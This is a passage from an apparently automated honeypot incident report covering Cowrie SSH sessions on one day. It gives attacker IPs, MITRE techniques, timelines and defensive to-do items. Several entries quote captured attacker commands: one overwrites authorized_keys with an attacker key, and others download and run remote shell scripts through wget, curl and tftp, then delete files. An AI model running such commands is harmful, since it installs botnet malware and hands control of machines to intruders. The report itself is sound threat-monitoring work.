| `2026-09-24 07:42:21` | `cowrie.client.kex` |
| `2026-09-24 07:42:21` | `cowrie.login.success` |
| `2026-09-24 07:42:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.58.38[.]201` to AbuseIPDB if not already reported
- [ ] Block `195.58.38[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e41c249d00c0

| Field | Detail |
|---|---|
| **Source IP** | `195.58.38[.]201` |
| **First Seen** | 2026-09-24 07:42 |
| **Last Seen** | 2026-09-24 07:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:42:22` | `cowrie.session.connect` |
| `2026-09-24 07:42:22` | `cowrie.client.version` |
| `2026-09-24 07:42:22` | `cowrie.client.kex` |
| `2026-09-24 07:42:22` | `cowrie.login.success` |
| `2026-09-24 07:42:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `195.58.38[.]201` to AbuseIPDB if not already reported
- [ ] Block `195.58.38[.]201` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-340f2dff86d4

| Field | Detail |
|---|---|
| **Source IP** | `102.140.97[.]134` |
| **First Seen** | 2026-09-24 07:42 |
| **Last Seen** | 2026-09-24 07:42 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:42:23` | `cowrie.session.connect` |
| `2026-09-24 07:42:23` | `cowrie.client.version` |
| `2026-09-24 07:42:23` | `cowrie.client.kex` |
| `2026-09-24 07:42:24` | `cowrie.login.success` |
| `2026-09-24 07:42:25` | `cowrie.session.params` |
| `2026-09-24 07:42:25` | `cowrie.command.input` |
| `2026-09-24 07:42:25` | `cowrie.command.failed` |
| `2026-09-24 07:42:25` | `cowrie.log.closed` |
| `2026-09-24 07:42:26` | `cowrie.session.params` |
| `2026-09-24 07:42:26` | `cowrie.command.input` |
| `2026-09-24 07:42:26` | `cowrie.session.file_download` |
| `2026-09-24 07:42:26` | `cowrie.log.closed` |
| `2026-09-24 07:42:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.140.97[.]134` to AbuseIPDB if not already reported
- [ ] Block `102.140.97[.]134` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-037fe2b32791

| Field | Detail |
|---|---|
| **Source IP** | `102.140.97[.]134` |
| **First Seen** | 2026-09-24 07:42 |
| **Last Seen** | 2026-09-24 07:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:42:26` | `cowrie.session.connect` |
| `2026-09-24 07:42:26` | `cowrie.client.version` |
| `2026-09-24 07:42:26` | `cowrie.client.kex` |
| `2026-09-24 07:42:27` | `cowrie.login.success` |
| `2026-09-24 07:42:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.140.97[.]134` to AbuseIPDB if not already reported
- [ ] Block `102.140.97[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6329921a3beb

| Field | Detail |
|---|---|
| **Source IP** | `102.140.97[.]134` |
| **First Seen** | 2026-09-24 07:42 |
| **Last Seen** | 2026-09-24 07:42 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:42:27` | `cowrie.session.connect` |
| `2026-09-24 07:42:27` | `cowrie.client.version` |
| `2026-09-24 07:42:28` | `cowrie.client.kex` |
| `2026-09-24 07:42:28` | `cowrie.login.success` |
| `2026-09-24 07:42:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.140.97[.]134` to AbuseIPDB if not already reported
- [ ] Block `102.140.97[.]134` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e8459b4a3f07

| Field | Detail |
|---|---|
| **Source IP** | `107.155.15[.]8` |
| **First Seen** | 2026-09-24 07:44 |
| **Last Seen** | 2026-09-24 07:44 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:44:01` | `cowrie.session.connect` |
| `2026-09-24 07:44:01` | `cowrie.client.version` |
| `2026-09-24 07:44:01` | `cowrie.client.kex` |
| `2026-09-24 07:44:02` | `cowrie.login.success` |
| `2026-09-24 07:44:03` | `cowrie.session.params` |
| `2026-09-24 07:44:03` | `cowrie.command.input` |
| `2026-09-24 07:44:03` | `cowrie.command.failed` |
| `2026-09-24 07:44:03` | `cowrie.log.closed` |
| `2026-09-24 07:44:04` | `cowrie.session.params` |
| `2026-09-24 07:44:04` | `cowrie.command.input` |
| `2026-09-24 07:44:04` | `cowrie.session.file_download` |
| `2026-09-24 07:44:04` | `cowrie.log.closed` |
| `2026-09-24 07:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.155.15[.]8` to AbuseIPDB if not already reported
- [ ] Block `107.155.15[.]8` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94d4e0b43697

| Field | Detail |
|---|---|
| **Source IP** | `107.155.15[.]8` |
| **First Seen** | 2026-09-24 07:44 |
| **Last Seen** | 2026-09-24 07:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:44:04` | `cowrie.session.connect` |
| `2026-09-24 07:44:04` | `cowrie.client.version` |
| `2026-09-24 07:44:04` | `cowrie.client.kex` |
| `2026-09-24 07:44:05` | `cowrie.login.success` |
| `2026-09-24 07:44:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.155.15[.]8` to AbuseIPDB if not already reported
- [ ] Block `107.155.15[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67d16f07b906

| Field | Detail |
|---|---|
| **Source IP** | `107.155.15[.]8` |
| **First Seen** | 2026-09-24 07:44 |
| **Last Seen** | 2026-09-24 07:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:44:05` | `cowrie.session.connect` |
| `2026-09-24 07:44:05` | `cowrie.client.version` |
| `2026-09-24 07:44:06` | `cowrie.client.kex` |
| `2026-09-24 07:44:06` | `cowrie.login.success` |
| `2026-09-24 07:44:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `107.155.15[.]8` to AbuseIPDB if not already reported
- [ ] Block `107.155.15[.]8` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656  (ELF Binary (Linux executable))
   SHA256: 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aa...
   Score : 86/100  |  VT: 40/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Execution from /tmp: /tmp/bot
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-f24fdd8c6beb

| Field | Detail |
|---|---|
| **Source IP** | `23.94.206[.]233` |
| **First Seen** | 2026-09-24 07:47 |
| **Last Seen** | 2026-09-24 07:47 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **Malware Analysis** | 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:47:17` | `cowrie.session.connect` |
| `2026-09-24 07:47:17` | `cowrie.login.success` |
| `2026-09-24 07:47:17` | `cowrie.session.params` |
| `2026-09-24 07:47:19` | `cowrie.command.input` |
| `2026-09-24 07:47:19` | `cowrie.command.input` |
| `2026-09-24 07:47:19` | `cowrie.session.file_download` |
| `2026-09-24 07:47:19` | `cowrie.session.file_download` |
| `2026-09-24 07:47:19` | `cowrie.session.file_download` |
| `2026-09-24 07:47:20` | `cowrie.session.file_download` |
| `2026-09-24 07:47:20` | `cowrie.session.file_download.failed` |
| `2026-09-24 07:47:20` | `cowrie.session.file_download` |
| `2026-09-24 07:47:20` | `cowrie.session.file_download` |
| `2026-09-24 07:47:34` | `cowrie.log.closed` |
| `2026-09-24 07:47:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `23.94.206[.]233` to AbuseIPDB if not already reported
- [ ] Block `23.94.206[.]233` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4d039020dba9

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-24 07:52 |
| **Last Seen** | 2026-09-24 07:53 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/nokillbins/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh, hxxp://213.232.114[.]14/nokillbins/handshakebins.sh |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 07:52:53` | `cowrie.session.connect` |
| `2026-09-24 07:52:53` | `cowrie.login.success` |
| `2026-09-24 07:52:54` | `cowrie.session.params` |
| `2026-09-24 07:52:55` | `cowrie.command.input` |
| `2026-09-24 07:52:55` | `cowrie.command.input` |
| `2026-09-24 07:52:56` | `cowrie.session.file_download` |
| `2026-09-24 07:52:56` | `cowrie.session.file_download` |
| `2026-09-24 07:52:56` | `cowrie.session.file_download` |
| `2026-09-24 07:52:56` | `cowrie.session.file_download` |
| `2026-09-24 07:52:56` | `cowrie.session.file_download.failed` |
| `2026-09-24 07:52:56` | `cowrie.session.file_download` |
| `2026-09-24 07:52:57` | `cowrie.session.file_download` |
| `2026-09-24 07:53:10` | `cowrie.log.closed` |
| `2026-09-24 07:53:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

```
⚠️  MALWARE ANALYSIS — HIGH SEVERITY SAMPLE DETECTED
   File  : 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656  (ELF Binary (Linux executable))
   SHA256: 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aa...
   Score : 86/100  |  VT: 40/75
   ↳ Download via wget: wget
   ↳ Download via curl: curl
   ↳ Execution from /tmp: /tmp/bot
   ↳ chmod +x (make executable): chmod +x
```

### 🔴 HIGH · IR-ab4903a4c145

| Field | Detail |
|---|---|
| **Source IP** | `94.154.43[.]69` |
| **First Seen** | 2026-09-24 08:02 |
| **Last Seen** | 2026-09-24 08:02 |
| **Session Duration** | 17s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `sh, cd /tmp || cd /run || cd /mnt || cd /root || cd /; wget hxxp://213.232.114[.]14/handshakebins.sh; busybox wget hxxp://213.232.114[.]14/handshakebins.sh; curl -o handshakebins.sh hxxp://213.232.114[.]14/handshakebins.sh; chmod 777 handshakebins.sh; sh handshakebins.sh; tftp 213.232.114[.]14 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 213.232.114[.]14; chmod 777 tftp2.sh; sh tftp2.sh; rm -rf handshakebins.sh tftp1.sh tftp2.sh; rm -rf *` |
| **Download Attempts** | hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh, hxxp://213.232.114[.]14/handshakebins.sh |
| **Malware Analysis** | 07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656 (HIGH) |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 08:02:19` | `cowrie.session.connect` |
| `2026-09-24 08:02:20` | `cowrie.login.success` |
| `2026-09-24 08:02:20` | `cowrie.session.params` |
| `2026-09-24 08:02:22` | `cowrie.command.input` |
| `2026-09-24 08:02:22` | `cowrie.command.input` |
| `2026-09-24 08:02:22` | `cowrie.session.file_download` |
| `2026-09-24 08:02:22` | `cowrie.session.file_download` |
| `2026-09-24 08:02:22` | `cowrie.session.file_download` |
| `2026-09-24 08:02:22` | `cowrie.session.file_download` |
| `2026-09-24 08:02:22` | `cowrie.session.file_download.failed` |
| `2026-09-24 08:02:23` | `cowrie.session.file_download` |
| `2026-09-24 08:02:23` | `cowrie.session.file_download` |
| `2026-09-24 08:02:37` | `cowrie.log.closed` |
| `2026-09-24 08:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `94.154.43[.]69` to AbuseIPDB if not already reported
- [ ] Block `94.154.43[.]69` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Review VT report: hxxps://www.virustotal.com/gui/file/07c0a0af63dde8dc2e36dc58b630dcad6563263e992877aaa704530afb8a5656
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e97574481854

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-09-24 08:34 |
| **Last Seen** | 2026-09-24 08:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 08:34:36` | `cowrie.session.connect` |
| `2026-09-24 08:34:36` | `cowrie.client.version` |
| `2026-09-24 08:34:36` | `cowrie.client.kex` |
| `2026-09-24 08:34:37` | `cowrie.login.success` |
| `2026-09-24 08:34:37` | `cowrie.direct-tcpip.request` |
| `2026-09-24 08:34:37` | `cowrie.direct-tcpip.data` |
| `2026-09-24 08:34:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b452179b5774

| Field | Detail |
|---|---|
| **Source IP** | `47.95.32[.]212` |
| **First Seen** | 2026-09-24 08:36 |
| **Last Seen** | 2026-09-24 08:36 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 08:36:46` | `cowrie.session.connect` |
| `2026-09-24 08:36:46` | `cowrie.client.version` |
| `2026-09-24 08:36:46` | `cowrie.client.kex` |
| `2026-09-24 08:36:48` | `cowrie.login.success` |
| `2026-09-24 08:36:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `47.95.32[.]212` to AbuseIPDB if not already reported
- [ ] Block `47.95.32[.]212` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-782774db802c

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-24 08:37 |
| **Last Seen** | 2026-09-24 08:38 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 08:37:54` | `cowrie.session.connect` |
| `2026-09-24 08:37:54` | `cowrie.client.version` |
| `2026-09-24 08:37:55` | `cowrie.client.kex` |
| `2026-09-24 08:37:55` | `cowrie.login.success` |
| `2026-09-24 08:37:58` | `cowrie.direct-tcpip.request` |
| `2026-09-24 08:37:58` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 08:37:58` | `cowrie.direct-tcpip.data` |
| `2026-09-24 08:38:00` | `cowrie.direct-tcpip.request` |
| `2026-09-24 08:38:01` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 08:38:01` | `cowrie.direct-tcpip.data` |
| `2026-09-24 08:38:03` | `cowrie.direct-tcpip.request` |
| `2026-09-24 08:38:04` | `cowrie.direct-tcpip.ja4` |
| `2026-09-24 08:38:04` | `cowrie.direct-tcpip.data` |
| `2026-09-24 08:38:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0179e8deb311

| Field | Detail |
|---|---|
| **Source IP** | `77.90.185[.]17` |
| **First Seen** | 2026-09-24 08:40 |
| **Last Seen** | 2026-09-24 08:40 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-09-24 08:40:36` | `cowrie.session.connect` |
| `2026-09-24 08:40:36` | `cowrie.client.version` |
| `2026-09-24 08:40:36` | `cowrie.client.kex` |
| `2026-09-24 08:40:37` | `cowrie.login.success` |
| `2026-09-24 08:40:49` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `77.90.185[.]17` to AbuseIPDB if not already reported
- [ ] Block `77.90.185[.]17` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `34.156.95[.]119` | **29** | 2026-09-24 04:13 | 2026-09-24 04:14 | 1m | 0 | `T1592` | 🟠 MEDIUM |
| `34.52.136[.]146` | **29** | 2026-09-24 03:05 | 2026-09-24 03:06 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `35.195.96[.]243` | **29** | 2026-09-24 03:32 | 2026-09-24 03:32 | 2m | 0 | `T1592` | 🟠 MEDIUM |
| `193.112.192[.]91` | **25** | 2026-09-24 04:27 | 2026-09-24 04:30 | 26m | 0 | `T1592` | 🟠 MEDIUM |
| `137.184.5[.]188` | **15** | 2026-09-24 03:30 | 2026-09-24 08:30 | 14m | 0 | `T1592` | 🟠 MEDIUM |
| `34.62.71[.]20` | **10** | 2026-09-24 06:06 | 2026-09-24 06:06 | 0m | 0 | `T1592` | 🟠 MEDIUM |
| `115.190.213[.]206` | **7** | 2026-09-24 07:19 | 2026-09-24 07:35 | 12m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **3** | 2026-09-24 02:57 | 2026-09-24 03:51 | 1m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]193` | **3** | 2026-09-24 06:53 | 2026-09-24 06:54 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]97` | **3** | 2026-09-24 06:52 | 2026-09-24 06:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.195[.]55` | **3** | 2026-09-24 06:52 | 2026-09-24 06:53 | 0m | 0 | `T1592` | 🟢 LOW |
| `109.210.188[.]167` | **2** | 2026-09-24 05:38 | 2026-09-24 05:38 | 0m | 0 | `T1592` | 🟢 LOW |
| `132.148.30[.]167` | **2** | 2026-09-24 07:22 | 2026-09-24 07:48 | 0m | 0 | `T1592` | 🟢 LOW |
| `142.93.69[.]27` | **2** | 2026-09-24 04:38 | 2026-09-24 04:52 | 0m | 0 | `T1592` | 🟢 LOW |
| `176.124.134[.]241` | **2** | 2026-09-24 04:06 | 2026-09-24 04:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `18.218.118[.]203` | **2** | 2026-09-24 04:57 | 2026-09-24 04:59 | 0m | 0 | `T1592` | 🟢 LOW |
| `20.98.166[.]207` | **2** | 2026-09-24 07:41 | 2026-09-24 07:42 | 0m | 0 | `T1592` | 🟢 LOW |
| `201.214.157[.]221` | **2** | 2026-09-24 04:43 | 2026-09-24 04:45 | 0m | 0 | `T1592` | 🟢 LOW |
| `213.174.10[.]241` | **2** | 2026-09-24 06:34 | 2026-09-24 06:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `223.18.97[.]175` | **2** | 2026-09-24 06:09 | 2026-09-24 06:09 | 0m | 0 | `T1592` | 🟢 LOW |
| `3.129.187[.]38` | **2** | 2026-09-24 06:37 | 2026-09-24 06:39 | 0m | 0 | `T1592` | 🟢 LOW |
| `31.202.87[.]158` | **2** | 2026-09-24 03:14 | 2026-09-24 03:29 | 0m | 0 | `T1592` | 🟢 LOW |
| `45.91.64[.]10` | **2** | 2026-09-24 05:49 | 2026-09-24 05:49 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.251.110[.]209` | **2** | 2026-09-24 04:32 | 2026-09-24 04:33 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.132.172[.]35` | **2** | 2026-09-24 05:10 | 2026-09-24 05:11 | 0m | 0 | `T1592` | 🟢 LOW |
| `66.228.40[.]100` | **2** | 2026-09-24 08:35 | 2026-09-24 08:35 | 0m | 0 | `T1592` | 🟢 LOW |
| `103.203.57[.]2` | 1 | 2026-09-24 05:59 | 2026-09-24 05:59 | 10s | 0 | `T1592` | 🟢 LOW |
| `103.203.59[.]9` | 1 | 2026-09-24 06:53 | 2026-09-24 06:54 | 10s | 0 | `T1592` | 🟢 LOW |
| `105.174.57[.]166` | 1 | 2026-09-24 06:09 | 2026-09-24 06:09 | 13s | 0 | `T1592` | 🟢 LOW |
| `106.80.184[.]232` | 1 | 2026-09-24 07:10 | 2026-09-24 07:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.228.233[.]93` | 1 | 2026-09-24 04:32 | 2026-09-24 04:34 | 120s | 0 | `T1592` | 🟢 LOW |
| `116.255.159[.]152` | 1 | 2026-09-24 07:11 | 2026-09-24 07:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `117.72.68[.]94` | 1 | 2026-09-24 03:22 | 2026-09-24 03:24 | 120s | 0 | `T1592` | 🟢 LOW |
| `118.35.190[.]116` | 1 | 2026-09-24 03:16 | 2026-09-24 03:16 | 28s | 0 | `T1592` | 🟢 LOW |
| `119.237.32[.]122` | 1 | 2026-09-24 05:57 | 2026-09-24 05:57 | 20s | 0 | `T1592` | 🟢 LOW |
| `120.211.138[.]165` | 1 | 2026-09-24 08:41 | 2026-09-24 08:43 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.152.123[.]106` | 1 | 2026-09-24 07:49 | 2026-09-24 07:50 | 15s | 0 | `T1592` | 🟢 LOW |
| `121.40.84[.]227` | 1 | 2026-09-24 08:01 | 2026-09-24 08:01 | 0s | 0 | `T1592` | 🟢 LOW |
| `122.114.255[.]230` | 1 | 2026-09-24 07:10 | 2026-09-24 07:12 | 120s | 0 | `T1592` | 🟢 LOW |
| `123.59.7[.]18` | 1 | 2026-09-24 05:27 | 2026-09-24 05:29 | 120s | 0 | `T1592` | 🟢 LOW |
| `124.174.15[.]24` | 1 | 2026-09-24 07:26 | 2026-09-24 07:28 | 120s | 0 | `T1592` | 🟢 LOW |
| `14.103.107[.]29` | 1 | 2026-09-24 03:25 | 2026-09-24 03:27 | 120s | 0 | `T1592` | 🟢 LOW |
| `148.52.229[.]83` | 1 | 2026-09-24 03:49 | 2026-09-24 03:49 | 0s | 0 | `T1592` | 🟢 LOW |
| `150.241.87[.]249` | 1 | 2026-09-24 07:45 | 2026-09-24 07:45 | 28s | 0 | `T1592` | 🟢 LOW |
| `174.138.49[.]97` | 1 | 2026-09-24 04:04 | 2026-09-24 04:04 | 0s | 0 | `T1592` | 🟢 LOW |
| `185.223.235[.]23` | 1 | 2026-09-24 06:14 | 2026-09-24 06:14 | 0s | 0 | `T1592` | 🟢 LOW |
| `190.115.189[.]194` | 1 | 2026-09-24 05:46 | 2026-09-24 05:46 | 15s | 0 | `T1592` | 🟢 LOW |
